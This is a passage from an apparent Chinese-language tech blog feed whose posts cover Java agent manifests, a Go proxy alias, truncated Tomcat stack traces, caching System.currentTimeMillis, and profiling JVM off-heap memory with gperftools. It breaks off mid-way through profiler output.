<h3 id="maven-assembly-plugin"><a href="#maven-assembly-plugin" class="headerlink" title="maven-assembly-plugin"></a>maven-assembly-plugin</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>**.**.InstrumentTest<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>**.**..InstrumentTest<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://unix.stackexchange.com/questions/15740/how-to-specify-option-with-gnu-getopt" rel="external nofollow noopener noreferrer" target="_blank">bash - How to specify -? option with GNU getopt - Unix &amp; Linux Stack Exchange</a></li>
<li><a href="https://linux.die.net/man/3/getopt" rel="external nofollow noopener noreferrer" target="_blank">getopt(3): Parse options - Linux man page</a></li>
<li><a href="https://docs.oracle.com/javase/7/docs/jdk/api/attach/spec/com/sun/tools/attach/VirtualMachine.html" rel="external nofollow noopener noreferrer" target="_blank">VirtualMachine (Attach API )</a></li>
<li><a href="http://www.fanyilun.me/2017/07/18/%E8%B0%88%E8%B0%88Java%20Intrumentation%E5%92%8C%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/" rel="external nofollow noopener noreferrer" target="_blank">谈谈Java Intrumentation和相关应用 | Yilun Fan’s Blog</a></li>
<li><a href="http://www.bijishequ.com/detail/435931?p=29-55" rel="external nofollow noopener noreferrer" target="_blank">Grays Anatomy源码浅析–ClassLoader,Java,Method,DES,null,方法,INVOKING</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html" rel="external nofollow noopener noreferrer" target="_blank">java.lang.instrument (Java Platform SE 8 )</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse61/index.html" rel="external nofollow noopener noreferrer" target="_blank">Java SE 6 新特性: Instrumentation 新功能</a></li>
<li><a href="https://docs.oracle.com/javase/7/docs/platform/jvmti/jvmti.html#writingAgents" rel="external nofollow noopener noreferrer" target="_blank">JVM(TM) Tool Interface 1.2.1</a></li>
<li><a href="https://www.gitbook.com/book/sachin-handiekar/learning-jvmti/details" rel="external nofollow noopener noreferrer" target="_blank">Learning JVMTI · GitBook</a></li>
<li><a href="http://lovestblog.cn/blog/2014/06/18/jvm-attach/" rel="external nofollow noopener noreferrer" target="_blank">JVM Attach机制实现 - 你假笨</a></li>
<li><a href="https://www.slideshare.net/hongjiang/shelljava" rel="external nofollow noopener noreferrer" target="_blank">Shell,信号量以及java进程的退出</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse63/" rel="external nofollow noopener noreferrer" target="_blank">Java SE 6 新特性: JMX 与系统管理</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> perf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> greys </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Let's go!(Go语言学习)]]></title>
      <url>http://qsli.github.io/2018/01/20/go-figure/</url>
      <content type="html"><![CDATA[<h2 id="go学习资料"><a href="#go学习资料" class="headerlink" title="go学习资料"></a>go学习资料</h2><h3 id="go-tutorial"><a href="#go-tutorial" class="headerlink" title="go tutorial"></a>go tutorial</h3><p><a href="https://tour.golang.org/list" rel="external nofollow noopener noreferrer" target="_blank">A Tour of Go</a></p>
<p>简单的语法介绍, 可以在线编译/运行</p>
<img src="/2018/01/20/go-figure/go-tour.png">
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="go-get访问被墙网站"><a href="#go-get访问被墙网站" class="headerlink" title="go get访问被墙网站"></a>go get访问被墙网站</h4><p>有些包只有墙外才能访问到, 因此第一步必须翻墙.</p>
<blockquote>
<p>另一个方法是实用 cow, 这是shadowsocks-go作者的另一个开发项目，根据项目介绍很容易的配置,可以在本机启动一个http代理，以shadowsocks为二级代理。</p>
</blockquote>
<p>补充一点, 用alias的方式, 可以只指定go使用代理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">alias</span> go=<span class="string">'http_proxy=127.0.0.1:8080  https_proxy=127.0.0.1:8080 go'</span></span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://colobu.com/2017/01/26/how-to-go-get-behind-GFW/" rel="external nofollow noopener noreferrer" target="_blank">如何在长城后面go get一些库 | 鸟窝</a></p>
</li>
<li><p><a href="https://tour.golang.org/list" rel="external nofollow noopener noreferrer" target="_blank">A Tour of Go</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/10383299/how-do-i-configure-go-to-use-a-proxy" rel="external nofollow noopener noreferrer" target="_blank">How do I configure Go to use a proxy? - Stack Overflow</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> go </category>
            
        </categories>
        
        
        <tags>
            
            <tag> go学习资料 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Tomcat日志中异常堆栈不完整]]></title>
      <url>http://qsli.github.io/2017/12/03/jvm-omit-fast-throw/</url>
      <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>tomcat的异常日志会打印到<code>catalina.out</code>中，有的时候发现日志的堆栈并不完整， 只能看到部分的堆栈信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Exception: NullPointerException | 2390852_pd2390852_prc2390852_sr2390852_ncb2390852_pm45090051_pd45090051_prc45090051_sr45090051_ncb45090051_pm36619638_pd36619638_prc36619638_sr36619638_ncb36619638_pm1122394_pd1122394_prc1122394_sr1122394_ncb1122394_pm</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        at sun.reflect.GeneratedMethodAccessor481.invoke(Unknown Source) ~[na:na]</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_60]</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:497) ~[na:1.8.0_60]</span><br><span class="line">        at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:221) ~[spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) ~[spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:110) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invoke</span><br><span class="line">java.lang.NullPointerException: null</span><br><span class="line">[2016-12-05 11:29:27][h_hprice_breeze_p_161205.112927.10.90.5.48.6486.595359_1][ESC[31mWARN ESC[0;39m]logX -&gt; desc = SHotel 状态无效, data = hotelId[</span><br></pre></td></tr></table></figure>
<p>可以看到这个<code>NPE</code>只打印了，一个message， 内部的堆栈都没有了，这样就无法根据堆栈信息找到对应的代码的位置。</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="jvm的优化"><a href="#jvm的优化" class="headerlink" title="jvm的优化"></a>jvm的优化</h3><blockquote>
<p>HotSpot虚拟机的JIT优化，把多次打的堆栈给优化掉了，往上Grep应该能Grep到完整的堆栈。</p>
</blockquote>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>这种被优化调的堆栈，第一次都是打出来完整的，因此可以向上翻翻，应该是能找到完整的现场的。</p>
<p>频繁的打印异常的堆栈，对系统性能也有较大的影响，不过如果不是生产环境，可以在jvm的启动参数后面加上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:-OmitStackTraceInFastThrow</span><br></pre></td></tr></table></figure>
<p>将这种优化主动关闭</p>
<h3 id="日志打的太快"><a href="#日志打的太快" class="headerlink" title="日志打的太快"></a>日志打的太快</h3><p>其实打到tomcat的<code>catalina.out</code>的应该是有两个日志框架，一个是tomcat自己带的，一个是应用的。</p>
<p>tomcat自己带了一个日志的框架 —— <code>juli</code></p>
<p>自己的应用中一般也会用一个日志的框架，比如 —— <code>logback</code></p>
<p>这样就存在同时写入<code>catalina.out</code>文件的可能，<code>juli</code>日志刚打了一半， 就被<code>logback</code>打的日志穿插了。<br>这样本来两行相邻的日志，就会差的十万八千里。</p>
<blockquote>
<p>Tomcat 的内部日志使用 JULI 组件，这是一个 Apache Commons 日志的重命名的打包分支，默认被硬编码，使用 java.util.logging 架构。<br>这能保证 Tomcat 内部日志与 Web 应用的日志保持独立，即使 Web 应用使用的是 Apache Commons Logging。</p>
</blockquote>
<p>正是这个独立性，导致了日志有可能是乱的。<br>tomcat加载内部的日志组件的加载器是<code>System class loader</code>，<br>应用的日志组件的类加载器是<code>webapp class loader</code>，因此即使用的是同一套日志体系，相互之间应该还是隔离的。</p>
<p>logback的官方文档也说明了：</p>
<blockquote>
<p>By virtue of class loader separation provided by the container,<br>each web-application will load its own copy of LoggerContext which will pickup its own copy of logback.xml.</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://jawspeak.com/2010/05/26/hotspot-caused-exceptions-to-lose-their-stack-traces-in-production-and-the-fix/" rel="external nofollow noopener noreferrer" target="_blank">Hotspot caused exceptions to lose their stack traces in production – and the fix at JAW Speak</a></p>
</li>
<li><p><a href="http://rongmayisheng.com/post/%E8%AF%91%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%BC%82%E5%B8%B8%E5%A0%86%E6%A0%88%E4%B8%A2%E5%A4%B1%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88" rel="external nofollow noopener noreferrer" target="_blank">[译]生产环境中异常堆栈丢失的解决方案 | 戎码一生</a></p>
</li>
<li><p><a href="http://wiki.jikexueyuan.com/project/tomcat/logging.html" rel="external nofollow noopener noreferrer" target="_blank">日志机制 - Tomcat 8 权威指南 - 极客学院Wiki</a></p>
</li>
<li><p><a href="https://logback.qos.ch/manual/loggingSeparation.html" rel="external nofollow noopener noreferrer" target="_blank">Chapter 9: Logging separation</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tomcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[缓存System.currentTimeMillis的调用]]></title>
      <url>http://qsli.github.io/2017/12/02/cache-system-time/</url>
      <content type="html"><![CDATA[<h2 id="系统时间缓存的必要"><a href="#系统时间缓存的必要" class="headerlink" title="系统时间缓存的必要"></a>系统时间缓存的必要</h2><img src="/2017/12/02/cache-system-time/time-cache.jpg">
<p>除了网络服务器，监控系统和日志系统也会频繁的调用<code>System.currentTimeMillis</code>。看公<br>司内部实现的异步日志中就对系统时间进行了缓存。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><script src="//gist.github.com/a42cea0411b2cff131f34d82d030115b.js"></script>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用<code>JMH</code>做一个<code>benchmark</code>压力测试， <code>JMH</code>在做测试之前会有预热的过程，以排<br>除<code>jit</code>等因素的影响，在系统达到稳定运行的时候再去对比两个方法的调用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RunnerException </span>&#123;</span><br><span class="line">Options opt = <span class="keyword">new</span> OptionsBuilder()</span><br><span class="line">               .include(CurrentTimeMillions<span class="class">.<span class="keyword">class</span>.<span class="title">getSimpleName</span>())</span></span><br><span class="line"><span class="class">               .<span class="title">mode</span>(<span class="title">Mode</span>.<span class="title">AverageTime</span>)</span></span><br><span class="line"><span class="class">               .<span class="title">measurementIterations</span>(2000)</span></span><br><span class="line"><span class="class">               .<span class="title">forks</span>(1)</span></span><br><span class="line"><span class="class">               .<span class="title">build</span>()</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">new</span> Runner(opt).run();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Run complete. Total time: 01:07:53</span><br><span class="line"></span><br><span class="line">Benchmark                            Mode   Cnt   Score     Error  Units</span><br><span class="line">CurrentTimeMillions.test             avgt  2000  ≈ 10⁻⁸             s/op</span><br><span class="line">CurrentTimeMillions.testSystemTimer  avgt  2000  ≈ 10⁻⁹             s/op</span><br></pre></td></tr></table></figure>
<p>可以看到还是差了一个数量级，如果对时间的精度要求没有那么高，还是可以缓存下的。</p>
<h2 id="查看调用的系统方法"><a href="#查看调用的系统方法" class="headerlink" title="查看调用的系统方法"></a>查看调用的系统方法</h2><p>使用<code>strace</code>attach 到当前的进程，查看进程相应的调用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -p  [pid]</span><br></pre></td></tr></table></figure>
<p>输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo strace -p 15588</span><br><span class="line">strace: Process 15588 attached</span><br><span class="line">futex(0x7f8c175f99d0, FUTEX_WAIT, 15589, NULL</span><br></pre></td></tr></table></figure>
<p>并没有看到具体的系统调用，查找原因发现：</p>
<blockquote>
<p>这里使用 ltrace 是因为 linux 支持 VDSO 之后，gettimeofday 属于快速系统调用，使<br>用 strace 是看不到执行结果的。</p>
</blockquote>
<blockquote>
<p>What is actually happening here is that we are linking to the vDSO (virtual<br>dynamic shared object), which is a small fully relocatable shared library<br>pre-mapped into the user address space. The linking happens during the first<br>call of gettimeofday, after which the call is resolved, and the first indirect<br>jump goes straight into the function.</p>
</blockquote>
<p>重新使用<code>ltrace</code>查看：</p>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo ltrace  -c -S  -p 16365</span><br><span class="line">^C% time     seconds  usecs/call     calls      <span class="keyword">function</span></span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line"> 76.73   14.190163        1880      7544 SYS_getegid32</span><br><span class="line"> 23.27    4.303741      614820         7 SYS_madvise1</span><br><span class="line">  0.00    0.000197          24         8 SYS_exit</span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line">100.00   18.494101                  7559 total</span><br></pre></td></tr></table></figure>
<p>然而还是没有看到<code>gettimeofday</code>的调用，具体原因不得而知。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><blockquote>
<p>premature optimization is the root of all evil 过早优化是万恶之源</p>
</blockquote>
<p>如果系统的性能能满足我们的要求，就不要过早的做这些优化 ; 系统优化之前需要先做<br>profiling，找到真正的瓶颈，在次之前需要保持系统的简单，可靠。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://blog.csdn.net/will_awoke/article/details/27084907" rel="external nofollow noopener noreferrer" target="_blank">SystemTimer CurrentTimeMillis 时间缓存 - CSDN 博客</a></p>
</li>
<li><p>《NIO trick and trap 》</p>
</li>
<li><p><a href="http://feiyang21687.github.io/SystemNano/" rel="external nofollow noopener noreferrer" target="_blank">System.nanoTime() 的实现分析 – 陈飞 – 码农</a></p>
</li>
<li><p><a href="http://blog.caoxudong.info/blog/2017/09/08/currentTimeMillis_in_java" rel="external nofollow noopener noreferrer" target="_blank">jdk8 中的时间获取</a></p>
</li>
<li><p><a href="http://pzemtsov.github.io/2017/07/23/the-slow-currenttimemillis.html" rel="external nofollow noopener noreferrer" target="_blank">The slow currentTimeMillis()</a></p>
</li>
<li><p><a href="http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8185891" rel="external nofollow noopener noreferrer" target="_blank">Bug ID: JDK-8185891 System.currentTimeMillis() is slow on Linux, especially with the HPET time source</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cache </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用google perf工具来排查堆外内存占用]]></title>
      <url>http://qsli.github.io/2017/12/02/google-perf-tools/</url>
      <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>线上机器内存不足，经常被系统<code>oom killer</code>干掉。</p>
<p>如果<code>tomcat</code>运行的好好的，突然被干掉了，没有任何线索，那么就可以使用下面的命令看看是不是<code>oom killer</code>搞的鬼</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dmesg | grep -i <span class="built_in">kill</span> | less</span><br><span class="line"></span><br><span class="line">Out of memory: Kill process 23195 (java) score 558 or sacrifice child</span><br><span class="line">Killed process 23195, UID 40001, (java) total-vm:81176732kB, anon-rss:64507900kB, file-rss:2604kB</span><br></pre></td></tr></table></figure>
<p>其中<code>anon-rss</code>是程序占用的物理内存，  64507900kB = 61.519527435302734 GB<br>系统总的内存也才<code>62GB</code>，linux发现没有可分配的内存，就会启用<code>oom killer</code>的机制，根据<code>oom_score_adj</code>的值去干掉相应的进程了。</p>
<p>系统上<code>oom_score_adj</code>的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">43722 total pagecache pages</span><br><span class="line">4335 pages in swap cache</span><br><span class="line">Swap cache stats: add 1009840, delete 1005505, find 76432470/76485037</span><br><span class="line">Free swap  = 49990420kB</span><br><span class="line">Total swap = 50331644kB</span><br><span class="line">16777215 pages RAM</span><br><span class="line">282254 pages reserved</span><br><span class="line">36481 pages shared</span><br><span class="line">16386140 pages non-shared</span><br><span class="line">[ pid ]   uid  tgid total_vm      rss cpu oom_adj oom_score_adj name</span><br><span class="line">[ 1419]     0  1419     2883       94  18     -17         -1000 udevd</span><br><span class="line">[ 2894]     0  2894     2660      105   6     -17         -1000 udevd</span><br><span class="line">[ 2895]     0  2895     2882       43   2     -17         -1000 udevd</span><br><span class="line">[  388]     0   388    16557       63  12     -17         -1000 sshd</span><br><span class="line">[ 1340]     0  1340   152806     9114   6       0             0 salt-minion</span><br><span class="line">[ 1341]     0  1341   110173     5224  22       0             0 salt-minion</span><br><span class="line">[14168]     0 14168     6899      149   6     -17         -1000 auditd</span><br></pre></td></tr></table></figure>
<p><code>tomcat</code>的进程占用内存最多，得分也最高 —— 558</p>
<h3 id="tomcat的配置"><a href="#tomcat的配置" class="headerlink" title="tomcat的配置"></a>tomcat的配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> -Xms44g -Xmx44g -server \</span><br><span class="line">-XX:+UseG1GC -XX:MaxGCPauseMillis=200 \</span><br><span class="line">-XX:InitiatingHeapOccupancyPercent=65 -XX:SurvivorRatio=8 \</span><br><span class="line">-XX:MaxTenuringThreshold=15 \</span><br><span class="line">-verbosegc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps \</span><br><span class="line">-XX:+PrintTenuringDistribution -XX:+PrintAdaptiveSizePolicy \</span><br><span class="line">-XX:-TraceClassUnloading \</span><br><span class="line">-XX:+DisableExplicitGC</span><br></pre></td></tr></table></figure>
<p>jvm最大的堆只有44GB， 但是从上面的日志中看到实际占用的内存达到了62GB，几乎把整个系统的内存都吃掉了。<br>既然堆内没有问题，问题自然应该出在堆外内存的占用上。</p>
<h2 id="java-堆外内存"><a href="#java-堆外内存" class="headerlink" title="java 堆外内存"></a>java 堆外内存</h2><p><a href="http://lovestblog.cn/blog/2015/05/12/direct-buffer/" rel="external nofollow noopener noreferrer" target="_blank">JVM源码分析之堆外内存完全解读 - 你假笨</a> 中说道：</p>
<blockquote>
<p>对于System.gc的实现，之前写了一篇文章来重点介绍，JVM源码分析之SystemGC完全解读，它会对新生代的老生代都会进行内存回收，这样会比较彻底地回收DirectByteBuffer对象以及他们关联的堆外内存，我们dump内存发现DirectByteBuffer对象本身其实是很小的，但是它后面可能关联了一个非常大的堆外内存，因此我们通常称之为『冰山对象』，我们做ygc的时候会将新生代里的不可达的DirectByteBuffer对象及其堆外内存回收了，但是无法对old里的DirectByteBuffer对象及其堆外内存进行回收，这也是我们通常碰到的最大的问题，如果有大量的DirectByteBuffer对象移到了old，但是又一直没有做cms gc或者full gc，而只进行ygc，那么我们的物理内存可能被慢慢耗光，但是我们还不知道发生了什么，因为heap明明剩余的内存还很多(前提是我们禁用了System.gc)。</p>
</blockquote>
<p>白衣大侠也建议：</p>
<blockquote>
<p>这时，就只能靠前面提到的申请额度超限时触发的system.gc()来救场了。但这道最后的保险其实也不很好，首先它会中断整个进程，然后它让当前线程睡了整整一百毫秒，而且如果gc没在一百毫秒内完成，它仍然会无情的抛出OOM异常。还有，万一，万一大家迷信某个调优指南设置了-DisableExplicitGC禁止了system.gc()，那就不好玩了。<br>所以，堆外内存还是自己主动点回收更好，比如Netty就是这么做的。</p>
</blockquote>
<h3 id="限制堆外内存的大小"><a href="#限制堆外内存的大小" class="headerlink" title="限制堆外内存的大小"></a>限制堆外内存的大小</h3><p>加上<code>-XX:MaxDirectMemorySize=4g</code>， 去除<code>-XX:+DisableExplicitG</code>观察了几天，发现并不能解决问题，于是继续使用<code>google perf tools</code>去观察下堆外内存的使用</p>
<h2 id="google-perf-tools"><a href="#google-perf-tools" class="headerlink" title="google perf tools"></a>google perf tools</h2><p><a href="https://github.com/gperftools/gperftools/tree/master" rel="external nofollow noopener noreferrer" target="_blank">下载地址</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>该工具主要利用了unix的一个环境变量LD_PRELOAD，它允许你要加载的动态库优先加载起来，相当于一个Hook了，<br>于是可以针对同一个函数可以选择不同的动态库里的实现了，比如googleperftools就是将malloc方法替换成了tcmalloc的实现，这样就可以跟踪内存分配路径了</p>
</blockquote>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>tomcat</code>的启动变量中加入下面的配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_PRELOAD=/usr/<span class="built_in">local</span>/lib/libtcmalloc.so</span><br><span class="line"><span class="built_in">export</span> HEAPPROFILE=/home/q/perf-result/</span><br><span class="line"><span class="built_in">export</span> HEAP_PROFILE_ALLOCATION_INTERVAL=2000000000</span><br></pre></td></tr></table></figure></p>
<p>HEAPPROFILE是存放结果的地址</p>
<blockquote>
<p>HEAP_PROFILE_ALLOCATION_INTERVAL    default: 1073741824 (1 Gb)    Dump heap profiling information once every specified number of bytes has been allocated by the program.</p>
</blockquote>
<p>查看运行中的日志:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumping heap profile to /home/q/perf-result/_23207.0927.heap (1755151 MB allocated cumulatively, 1267 MB currently in use)</span><br></pre></td></tr></table></figure></p>
<p>日志中会显示累计的对外内存的分配和当前使用的堆外内存的大小。</p>
<h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><h4 id="文本形式的"><a href="#文本形式的" class="headerlink" title="文本形式的"></a>文本形式的</h4><p>命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/bin/pprof --text /home/q/java/default/bin/java _23207.0035.heap</span><br></pre></td></tr></table></figure></p>
<p>输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Using local file /home/q/java/default/bin/java.</span><br><span class="line">Using local file _23207.1012.heap.</span><br><span class="line">Total: 1283.1 MB</span><br><span class="line"></span><br><span class="line">     0.0   0.0% 100.0%     39.5   3.1% PtrQueue::enqueue_known_active</span><br><span class="line">     0.0   0.0% 100.0%     39.5   3.1% PtrQueueSet::allocate_buffer</span><br><span class="line">     0.0   0.0% 100.0%     42.2   3.3% G1ParTask::work</span><br><span class="line">     0.0   0.0% 100.0%     42.2   3.3% GangWorker::loop</span><br><span class="line">     0.0   0.0% 100.0%     75.6   5.9% ObjArrayKlass::oop_oop_iterate_nv_m@8fbe80</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% 0x00007f63bf0e5825</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% JVM_InternString</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% StringTable::intern@a24ca0</span><br><span class="line">     0.0   0.0% 100.0%    147.2  11.5% StringTable::basic_add</span><br><span class="line">     0.0   0.0% 100.0%    147.3  11.5% StringTable::intern@a24780</span><br><span class="line">     0.0   0.0% 100.0%    152.4  11.9% Hashtable::new_entry</span><br><span class="line">     0.0   0.0% 100.0%    170.5  13.3% AllocateHeap</span><br><span class="line">     0.0   0.0% 100.0%    256.0  20.0% ConcurrentMark::ConcurrentMark</span><br><span class="line">     0.0   0.0% 100.0%    265.5  20.7% 